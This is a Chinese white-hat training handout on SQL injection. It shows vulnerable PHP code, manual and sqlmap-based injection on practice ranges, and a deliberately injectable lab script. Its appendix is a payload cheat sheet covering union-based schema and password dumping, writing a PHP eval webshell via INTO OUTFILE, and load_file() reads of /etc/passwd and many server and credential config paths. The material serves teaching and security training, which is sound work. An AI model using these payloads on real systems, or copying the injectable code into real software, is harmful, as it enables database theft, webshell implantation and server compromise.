# 米斯特白帽培训讲义 漏洞篇 SQL 注入

> 讲师：[gh0stkey](https://www.zhihu.com/people/gh0stkey/answers)

> 整理：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

## 原理与危害

SQL 注入就是指，在输入的字符串中注入 SQL 语句，如果应用相信用户的输入而对输入的字符串没进行任何的过滤处理，那么这些注入进去的 SQL 语句就会被数据库误认为是正常的 SQL 语句而被执行。

恶意使用 SQL 注入攻击的人可以通过构建不同的 SQL 语句进行脱裤、命令执行、写 Webshell、读取度武器敏感系统文件等恶意行为。

![](http://ww3.sinaimg.cn/large/841aea59jw1fav3np94knj20i705dgm1.jpg)

以上来自乌云的案例，都是利用 SQL 注入所造成的一系列危害。

## 成因

首先来看这一段代码（视频中不是这段代码，因为其更适合讲解，所以用这段代码）：

```php
$un = @$_POST['un'];
$pw = @$_POST['pw'];

// ...

$sql = "select * from user where un='$un' and pw='$pw'";
```

可以看到代码首先从 HTTP 主体取得`un`和`pw`两个参数，这两个参数显然未加过滤。之后代码将其拼接到 SQL 语句中。

如果恶意用户将`un`指定为任意正常内容，`pw`为非正常内容，那么就有被攻击的风险。比如我们将`un`赋为`admin`，`pw`赋为`' or '1'='1`。则整个 SQL 语句会变为：

```sql
select * from user where un='admin' and pw='' or '1'='1'
```

可以看到`where`子句对于任何用户都是恒成立的。那么我们就成功绕过了它的身份验证。


## 手工注入

自己搭建环境比较麻烦，大家可以使用`http://mst.hi-ourlife.com/hackertest/`这个靶场，秘钥是`ZGhhc2poZGppYXNnaGQ=`。

我们进入靶场，我们用它来演示手工注入，当然它现在只支持 MySQL 类型的手工注入：

![](http://ww1.sinaimg.cn/large/841aea59jw1fav3nuo3eej20m608y0ta.jpg)

首先我们使用单引号判断一下，发现它出错了：

![](http://ww3.sinaimg.cn/large/841aea59jw1fav3o1ylr3j20p609d0tl.jpg)

然后是`and 1=1`：

![](http://ww3.sinaimg.cn/large/841aea59jw1fav3o5oqt4j20d00893yv.jpg)

然后是`and 1=2`：

![](http://ww3.sinaimg.cn/large/841aea59jw1fav3o9on4nj20ds08pt94.jpg)

下一步就是要看它的字段长度，使用`order by`。我们先输入一个大一些的数，比如`10`：

![]()

返回假，然后尝试`5`，返回真，说明字段数量为 5：

![](http://ww2.sinaimg.cn/large/841aea59jw1fav3oe9yhhj20ig08ewf0.jpg)

之后我们需要匹配它的字段，直接用`union`爆破字段。

![](http://ww4.sinaimg.cn/large/841aea59jw1fav3ottg6fj20h108b3z1.jpg)

查询结果是`2`，说明第二个字段最终显示，那么我们可以替换`union`中的`2`，比如我们查询一下`version()`。

![](http://ww1.sinaimg.cn/large/841aea59jw1fav3p0a80nj20hn086dge.jpg)

## 手工注入（2）

这次是实战靶场。首先访问如图的 URL，猜测`id`参数可能是注入点：

![](http://ww2.sinaimg.cn/large/841aea59jw1fav3p4exrzj213v0nf763.jpg)

首先按照前面的方式判断是否存在注入：

![](http://ww3.sinaimg.cn/large/841aea59jw1fav3p6vjdmj213l0nfjt2.jpg)

可以看到`and 1=1`返回正常，`and 1=2`返回异常，表明存在注入。（正常异常的标准是，和不加`and`一样就算正常）

之后使用`order by`探测字段数量，尝试到`2`时，发现返回正常。

![](http://ww3.sinaimg.cn/large/841aea59jw1fav3pw30bkj213i0nrq4t.jpg)

联合查询之后，发现页面中显示`1`：

![](http://ww3.sinaimg.cn/large/841aea59jw1fav3q44w4kj213i0ncabs.jpg)

使用`version()`替换联合查询中的`1`，得到版本：

![](http://ww2.sinaimg.cn/large/841aea59jw1fav3q71o2gj213a0nejt2.jpg)

同理我们可以查看`database()`和`user()`。

![](http://ww4.sinaimg.cn/large/841aea59jw1fav3qao8jnj213o0nf0ul.jpg)

![](http://ww4.sinaimg.cn/large/841aea59jw1fav3ql0pr2j213e0ntgng.jpg)

## SqlMap 的使用

键入如下命令并执行：

![](http://ww2.sinaimg.cn/large/841aea59jw1fav3qq765vj20ig0bzjrk.jpg)

![](http://ww4.sinaimg.cn/large/841aea59jw1fav3qsuiz2j20ig0bvwfi.jpg)

![](http://ww1.sinaimg.cn/large/841aea59jw1fav3qw2dggj20if0bw0u9.jpg)

![](http://ww4.sinaimg.cn/large/841aea59jw1fav3qyii0jj20ih0bu76d.jpg)

![](http://ww4.sinaimg.cn/large/841aea59jw1fav3r3l3jhj20ih0bymyt.jpg)

![](http://ww3.sinaimg.cn/large/841aea59jw1fav3r7ixwzj20ih0bvt9y.jpg)


可以从中看到所有的载荷（payload）。并且我们之前判断的没有错，就是`kg`。

之后我们再获取`kg`中的表：

![](http://ww4.sinaimg.cn/large/841aea59jw1fav3raav6kj20ig0bvt9v.jpg)

![](http://ww2.sinaimg.cn/large/841aea59jw1fav3s3jrjhj20ij0btgnm.jpg)

![](http://ww4.sinaimg.cn/large/841aea59jw1fav3sb90eaj20ih0bwdhw.jpg)

![](http://ww2.sinaimg.cn/large/841aea59jw1fav3sf2ae6j20ij0bwq4n.jpg)

结果是没有找到任何表。

## 环境搭建

（这节内容课件里面没有，是我自己补充的。）

大家可以下载 DVWA 在本地建立实验环境，如果觉得麻烦，可以自己写个脚本来建立。这里教给大家如何在本地建立实验环境。

首先要在任意数据库创建一张表，插入一些数据：

```sql
drop table if exists sqlinj;
create table if not exists sqlinj (
    id int primary key auto_increment,
    info varchar(32)
);
insert into sqlinj values (1, "item: 1");
```

这里我们创建了`sqlinj`表，并插入了一条数据。其实插入一条数据就够了，足以查看显示效果。

之后我们将以下内容保存为`sql.php`：

```php
<form method="POST" action="./sql.php">
    ID：
    <input type="text" name="id" />
    <input type="submit" value="查询" />
</form>
<?php
// 改成自己机子上的配置：
$host = '';
$port = 3306;
$un = '';
$pw = '';
$db = '';

$id = @$_POST['id'];
if($id == '')
    return;
$conn = @mysql_connect($host . ':' . $port, $un, $pw);
if(!$conn)
    die('数据库连接错误：' . mysql_error());
mysql_select_db($db, $conn);
$sql = "select id, info from sqlinj where id=$id";
$res = mysql_query($sql, $conn);
if(!$res)
    die('数据库错误：'. mysql_error());
$num = mysql_num_rows($res);
if($num == 0)
{ 
    echo "<p>ID：$id</p>";
    echo "<p>无此记录</p>";
}
else
{
    $row = mysql_fetch_row($res);
    echo "<p>ID：$id</p>";
    echo "<p>Info：${row[1]}</p>";
}
mysql_close($conn);
```

在文件目录下执行`php -S 0.0.0.0:80`，然后访问`http://localhost/sql.php`，然后就可以进行各种操作了：

![](http://ww2.sinaimg.cn/large/841aea59jw1fav5xpjnpsj20ga03w3yi.jpg)

![](http://ww1.sinaimg.cn/large/841aea59jw1fav5xy1misj20fh05k3yk.jpg)

![](http://ww1.sinaimg.cn/large/841aea59jw1fav5y7pnfhj20ic06aglp.jpg)

![](http://ww2.sinaimg.cn/large/841aea59jw1fav5ydedvrj20fn06edfw.jpg)

![](http://ww4.sinaimg.cn/large/841aea59jw1fav5yis68oj20fj06at8s.jpg)

![](http://ww3.sinaimg.cn/large/841aea59jw1fav5ymvj0zj20fp06bmxa.jpg)

## 附录

判断是否存在SQL注入

```
'
and 1=1
and 1=2
```

暴字段长度

```
Order by 数字
```

匹配字段

```
and 1=1 union select 1,2,..,n
```

暴字段位置

```
and 1=2 union select 1,2,..,n
```
 
利用内置函数暴数据库信息

```
version() database() user()
```

不用猜解可用字段暴数据库信息(有些网站不适用):

```
and 1=2 union all select version() 
and 1=2 union all select database() 
and 1=2 union all select user() 
```

操作系统信息：

```
and 1=2 union all select @@global.version_compile_os from mysql.user 
```

数据库权限：

```
and ord(mid(user(),1,1))=114  返回正常说明为root
```

暴库 (mysql>5.0)

Mysql 5 以上有内置库 `information_schema`，存储着mysql的所有数据库和表结构信息

```
and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1
```

猜表

```
and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）—
```

猜字段

```
and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1
```

暴密码

```
and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1
```

高级用法（一个可用字段显示两个数据内容）：

```
Union select 1,2,3,concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1
```

直接写马(Root权限)

条件：

1、知道站点物理路径

2、有足够大的权限（可以用s`elect …. from mysql.user`测试）

3、`magic_quotes_gpc()=OFF`

```
select ‘<?php eval_r($_POST[cmd])?>' into outfile ‘物理路径'
and 1=2 union all select 一句话HEX值 into outfile '路径'
```

`load_file()` 常用路径：

1.  `replace(load_file(0×2F6574632F706173737764),0×3c,0×20)`
1.  `replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))`
上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 `<` 替换成”空格” 返回的是网页.而无法查看到代码.
1.  `load_file(char(47))` 可以列出FreeBSD,Sunos系统根目录
1.  `/etc tpd/conf tpd.conf`或`/usr/local/apche/conf tpd.conf` 查看linux APACHE虚拟主机配置文件
1.  `c:\Program Files\Apache Group\Apache\conf \httpd.conf` 或`C:\apache\conf \httpd.conf `查看WINDOWS系统apache文件
1.  `c:/Resin-3.0.14/conf/resin.conf` 查看jsp开发的网站 resin文件配置信息.
1.  `c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf` 查看linux系统配置的JSP虚拟主机
1.  `d:\APACHE\Apache2\conf\httpd.conf`
1.  `C:\Program Files\mysql\my.ini`
1.  `../themes/darkblue_orange/layout.inc.php phpmyadmin` 爆路径
1.  `c:\windows\system32\inetsrv\MetaBase.xml` 查看IIS的虚拟主机配置文件
1.  `/usr/local/resin-3.0.22/conf/resin.conf` 针对3.0.22的RESIN配置文件查看
1.  `/usr/local/resin-pro-3.0.22/conf/resin.conf` 同上
1.  `/usr/local/app/apache2/conf/extra tpd-vhosts.conf` APASHE虚拟主机查看
1.  `/etc/sysconfig/iptables` 本机防火墙策略
1.  `usr/local/app/php5 b/php.ini` PHP 的相当设置
1.  `/etc/my.cnf` MYSQL的配置文件
1.  `/etc/redhat-release` 红帽子的系统版本
1.  `C:\mysql\data\mysql\user.MYD` 存在MYSQL系统中的用户密码
1.  `/etc/sysconfig/network-scripts/ifcfg-eth0` 查看IP.
1.  `/usr/local/app/php5 b/php.ini` //PHP相关设置
1.  `/usr/local/app/apache2/conf/extra tpd-vhosts.conf` //虚拟网站设置
1.  `C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini`
1.  `c:\windows\my.ini`
1.  `c:\boot.ini`

网站常用配置文件 

```
config.inc.php、config.php。
```

`load_file()`时要用`replace(load_file(HEX)，char(60),char(32))`

注：

```
Char(60)表示 <
Char（32）表示 空格
```

手工注射时出现的问题：

当注射后页面显示：

```
Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation 'UNION'
```

如：

```
/instrument.php?ID=13 and 1=2 union select 1,load_file(0x433A5C626F6F742E696E69),3,4,user()
```

这是由于前后编码不一致造成的，

解决方法：在参数前加上 `unhex(hex(参数))`就可以了。上面的URL就可以改为：

```
/instrument.php?ID=13 and 1=2 union select 1,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))
```
